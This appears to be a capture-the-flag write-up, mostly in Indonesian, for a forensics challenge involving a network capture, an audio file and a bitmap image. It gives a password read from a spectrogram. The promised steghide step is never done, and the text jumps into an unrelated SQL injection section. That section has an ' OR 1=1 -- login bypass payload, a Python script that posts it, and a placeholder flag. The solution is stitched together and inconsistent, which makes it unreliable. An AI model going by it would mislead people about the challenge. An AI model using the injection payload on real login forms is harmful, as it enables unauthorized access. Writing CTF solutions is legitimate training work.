# TryHards - [Echoes From The Noise](https://tryhards.community/challenges#Echoes%20from%20the%20Noise-9)

* **Kategori:** Forensics
* **Difficulty:** Easy

---

## Challenge Description

> A network capture reveals suspicious HTTP traffic.
> Two files were downloaded — an audio recording and a bitmap image. One hides a password, the other holds the flag. Find both.

Files provided:
* `evidence.zip`

---

## Reconnaissance

### Tools yang Digunakan:
* **Wireshark** - Untuk melihat traffic jaringan.
* **Audacity** - Untuk menganalisis gelombang audio.
* **Steghide** - Untuk mengekstrak data yang ada di file gambar.

## Analisis & Eksploitasi

1. **Ekstrak file evidence.zip:**
   Saat mengekstrak file `evidence.zip`, kita mendapatkan file `capture.pcap`
   Buka file `capture.pcap` dengan Wireshark

2. **Melihat Traffic jaringan dengan Wireshark (`capture.pcap`):**
   Pada Bagian Fillter kita fillter traffic HTTP:
   Disana kita melihat ada beberapa file, ada file `recording.mav` dan `photo.bmp`.
   Kita Download file tersebut dengan cara:
   -Klik File
   -Eksport Obejct dan pilih HTTP lalu save all.

---

3. **Mengekstrak data yag ada di `recording.mav`**
   Buka Software `Audacity` dan pilih file `recording.mav` kalian melihatnya biasa biasa saja kan???, Sandinya tersembunyi di track visualization, kita ubah track visualizationnya ke spectrogram dan sandinya sudah kelihatan yaitu:
   
   ```text
   s1390_Lsb_k3y
   ```
   Sandi ini kita gunakan untuk membuka file gambarnya nanti.
---

## Exploitation (Eksploitasi)

1. **Membuat payload uji coba:**
   Kita mencoba memasukkan *payload* *bypass* standar pada form login:
   ```text
   username: ' OR 1=1 --
   password: (kosongkan)
   ```

2. **Menjalankan script otomatis (opsional):**
   Jika menggunakan script Python untuk *exploit*:
   ```python
   import requests

   url = "http://ctf.local"
   payload = {"username": "' OR 1=1 --", "password": ""}
   r = requests.post(url, data=payload)

   print(r.text)
   ```

3. **Hasil:**
   Respon server mengembalikan halaman dashboard admin dan menampilkan *flag*:
   > `CTF{contoh_flag_hasil_solve_12345}`

---

## Kesimpulan / Lessons Learned

* Selalu gunakan **Parameterized Queries** atau **ORM** untuk mencegah SQL Injection pada aplikasi web.

